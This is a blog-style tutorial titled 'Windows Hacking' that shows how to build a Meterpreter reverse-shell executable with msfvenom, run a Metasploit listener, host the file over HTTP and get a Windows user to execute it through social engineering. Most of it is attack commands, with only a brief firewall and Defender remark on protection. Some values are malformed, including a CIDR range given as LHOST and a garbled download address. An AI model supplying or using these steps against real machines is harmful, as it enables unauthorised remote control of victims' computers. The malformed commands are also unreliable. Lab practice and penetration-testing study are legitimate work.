---
title: Windows Hacking
date: 2026-07-11
category: Security
summary: Setting up a reverse shell and metasploit listener for Windows penetration testing.
tags:
  - Metasploit
  - Windows
  - Reverse Shell
slug: windows-hacking
---

# Windows Hacking

WINDOWS AND LINUX HACKING

		
Create metasploit:

Before creating the metasploit, we need to figure out what is our Kali Linux local IP.
For that, run  “ip addr”  or  “ifconfig”
![image](https://github.com/user-attachments/assets/f5e84bbf-46d3-4ce6-b433-0c35288705fa)

 
In the terminal run the follow command:

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.0/24 LPORT=4444 –f exe > reverse_shell.exe
![image](https://github.com/user-attachments/assets/1e650a7e-9308-48b6-be77-7e482e8eadc0)

 

The command above instructs msfvenom to generate a 32-bit Windows executable file that implements a reverse TCP connection for the payload. The format must be specified as being type .exe, and the local host (LHOST) and local port (LPORT) have to be defined. In our case, the LHOST is the IP address of our attacking Kali Linux machine that we got in the last command, and the LPORT is the port to listen on for a connection from the target once it has been compromised.
The name of the .exe is up to you. In this case I’ll be using reverse_shell.exe because our target will be a only for test purpose.

Connection:


We now need to set up a listener on the port we determined within the executable. We do this by launching Metasploit using the command msfconsole on the Kali Linux terminal.
![image](https://github.com/user-attachments/assets/659e1ce5-8860-4f95-8c75-62ee6d1ce198)

 
The screenshot below shows what commands to issue within Metasploit. First, we’ll tell Metasploit to use the generic payload handler “multi/handler” using the command “use multi/handler”. We will then set the payload to match the one set within the executable using the command “set  payload windows/meterpreter/reverse_tcp”. We will then set the LHOST and LPORT this way — “set LHOST 192.168.47.152”and  “set  LPORT 4444”. Once done, type ```run``` or ```exploit```and press Enter.
The screenshot below displays the output. The reverse TCP handler should begin waiting for a connection.

![image](https://github.com/user-attachments/assets/57dae01d-54fe-45e2-b071-0a04e5315e80)

You can use show “options” command  to check if everything’s ok
![image](https://github.com/user-attachments/assets/3f18bc7f-c2b6-4388-9cb0-6219b44c6b09)


If everything’s ok type run or exploit
![image](https://github.com/user-attachments/assets/99756288-e6f7-4914-9cbc-caef4fafc2b4)

 

Social Engineer:


Now it’s the part that you need to do some social engineer in order to make the user execute the program.
For this tutorial we will simply host the .exe on python3 and transfer it on the Windows Machine.
![image](https://github.com/user-attachments/assets/f59d1b56-0155-42ee-a8e2-958d098eb64d)

 
On the Windows machine you just need to access via the browser the IP/File.exe
In our case is 192.168.o.o/24:8888/reverse_shell.exe .  Host  in python

![image](https://github.com/user-attachments/assets/0ffef250-39db-4dc3-a5d7-4aed0dfccd94)



 
Now execute and check the connection on the Kali Machine.
![image](https://github.com/user-attachments/assets/957c6ca9-9f2f-46fd-b35d-2f09ae9c1591)


 

 

Successfully compromise my windows machine using kali linux. It is only for educational purpose only.

How to Protect:
For this type of attacks the most important thing is to have the Firewall enabled. Windows Defender makes a good job protecting files like this.


